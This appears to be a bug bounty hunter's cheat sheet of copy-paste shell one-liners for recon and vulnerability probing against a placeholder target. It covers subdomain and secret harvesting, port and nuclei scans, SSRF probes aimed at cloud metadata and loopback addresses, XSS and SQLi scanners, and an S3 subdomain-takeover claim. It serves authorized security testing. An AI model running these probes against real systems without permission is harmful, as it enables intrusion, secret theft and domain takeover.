# Recon + Hunt One-Liners — copy/paste, edit `$T`

```bash
# === Phase 1 - Recon ===
T=target.com

# Subdomain harvest
subfinder -d $T -all -silent | tee subs.txt
amass enum -passive -d $T -silent >> subs.txt
chaos -d $T -silent >> subs.txt
github-subdomains -d $T -t $GH_TOKEN >> subs.txt
crt.sh-bash $T >> subs.txt 2>/dev/null
sort -u subs.txt -o subs.txt

# Brute + permutate
puredns bruteforce best-dns-wordlist.txt $T -r resolvers.txt -w bf.txt
gotator -sub subs.txt -perm permutations.txt -depth 2 | puredns resolve -r resolvers.txt > perm.txt
cat subs.txt bf.txt perm.txt | sort -u > all_subs.txt

# DNS resolve + IP map
dnsx -l all_subs.txt -a -aaaa -cname -resp -silent -j > dns.json
asnmap -d $T -silent

# Live HTTP
httpx -l all_subs.txt -silent -status-code -title -tech-detect -ip -cname -follow-redirects -web-server -hash sha256 -o httpx.json -j

# Visual triage
gowitness scan file -f live.txt --no-http
nuclei -l live.txt -t exposures/ -t default-logins/ -t cves/ -severity critical,high

# Port + service
naabu -l live.txt -top-ports 1000 -rate 5000 -silent -o ports.txt
nmap -sV -sC -Pn -iL ports.txt -oA nmap

# Content discovery
ffuf -w raft-large.txt -u https://$T/FUZZ -mc all -fc 404 -ac -e .php,.bak,.zip,.tar,.json -recursion -recursion-depth 2 -o ffuf.json -of json

# URL harvest
gau --threads 10 $T > gau.txt
waybackurls $T > wayback.txt
katana -d 5 -jc -kf all -aff -fs fqdn -list live.txt > katana.txt
cat gau.txt wayback.txt katana.txt | sort -u > all_urls.txt

# Param + sink miners
gf xss < all_urls.txt > params_xss.txt
gf ssrf < all_urls.txt > params_ssrf.txt
gf sqli < all_urls.txt > params_sqli.txt
gf rce < all_urls.txt > params_rce.txt
qsreplace FUZZ < all_urls.txt > all_urls_fuzz.txt

# JS recon
grep -oE 'https?://[^"]+\.js' all_urls.txt | sort -u > js.txt
xargs -a js.txt -P 10 -I{} curl -sk -o "js/$(echo {} | md5sum | awk '{print $1}').js" {}
linkfinder -i 'js/*'  -o linkfinder.html
jsluice urls js/*.js > js_urls.txt
jsluice secrets js/*.js > js_secrets.txt

# Source map fetch
shujisan -u $T

# === Phase 2 - Secret recon ===
trufflehog github --org=$T --only-verified --concurrency=10 > th.txt
trufflehog filesystem ./js --only-verified
gitleaks detect --source=./repo --report-path=gl.json
noseyparker scan ./code -d data && noseyparker report -d data
gitdorks_go -gd ~/dorks.txt -tf ~/.gh_token -target $T

# Postman public search (browser)
# https://www.postman.com/search?q=$T

# Cloud bucket
cloud_enum -k $T
s3scanner scan -bucket-file buckets.txt

# === Phase 3 - Subdomain takeover ===
subzy run --targets all_subs.txt --concurrency 100 --hide_fails
nuclei -l all_subs.txt -t takeovers/ -severity high,critical

# === Phase 4 - Vuln scanning baseline ===
nuclei -l live.txt -t cves/ -t exposures/ -t misconfiguration/ -t default-logins/ -severity critical,high,medium -rate-limit 50

# === Phase 5 - Param + auth ===
arjun -i live.txt -m GET,POST -t 50 > arjun.txt
paramspider -d $T --level high -o params.txt

# Authz testing (Burp Autorize ext recommended; CLI):
# Replay each request once with Cookie A, once with Cookie B; diff outputs.

# === Phase 6 - Specific bug class probes ===

# SSRF probe (replace url= with target's param)
for u in $(cat params_ssrf.txt); do
  for p in "http://169.254.169.254/" "http://127.0.0.1/" "http://[::1]/" "http://2130706433/"; do
    curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" "${u/FUZZ/$(jq -rn --arg p "$p" '$p|@uri')}"
  done
done

# Open redirect probe
qsreplace 'https://your.oast/' < params_redirect.txt | xargs -P10 -I{} curl -sk -o /dev/null -w "%{redirect_url}\t{}\n" {}

# XSS quick probe (Dalfox)
dalfox file params_xss.txt --skip-bav -o dalfox.txt --silence

# SQLi quick probe (don't run on prod blindly)
ghauri -u "https://$T/?id=1" --batch --level 3 --risk 2

# === Phase 7 - Subdomain takeover claim helpers ===
# (only with program permission)
# AWS S3
aws s3api create-bucket --bucket dangling-bucket-name --region us-east-1
echo '<h1>poc</h1>' > index.html
aws s3 cp index.html s3://dangling-bucket-name/

# === Phase 8 - Capture for report ===
# Burp project file: File -> Save project as
# Video: ffmpeg -f x11grab / OBS / Loom
# curl with full headers:
curl -sk -v 'https://target/...' 2>&1 | tee req.txt
```

---

## SETUP TIPS

```bash
# Fresh box
go install github.com/projectdiscovery/{subfinder,httpx,naabu,nuclei,katana,dnsx,asnmap,mapcidr,interactsh-client,chaos-client/cmd/chaos}/cmd/...@latest

pipx install trufflehog gitleaks
brew install ffuf gowitness amass

# Wordlists
git clone https://github.com/danielmiessler/SecLists ~/wordlists/SecLists
git clone https://github.com/assetnote/commonspeak2-wordlists ~/wordlists/commonspeak2

# Resolvers
wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O ~/resolvers.txt
```

---

## DAILY HUNT LOOP (cron-style)

```bash
# Save to ~/hunt-loop.sh
T=$1
DATE=$(date +%Y-%m-%d)
mkdir -p ~/hunt/$T/$DATE
cd ~/hunt/$T/$DATE
subfinder -d $T -all -silent | tee subs.txt
httpx -l subs.txt -silent -o live.txt
diff <(sort ../latest/live.txt 2>/dev/null) <(sort live.txt) > new.txt
[ -s new.txt ] && notify -bulk -data new.txt -id "$T new hosts"
ln -sfn $DATE ../latest
```
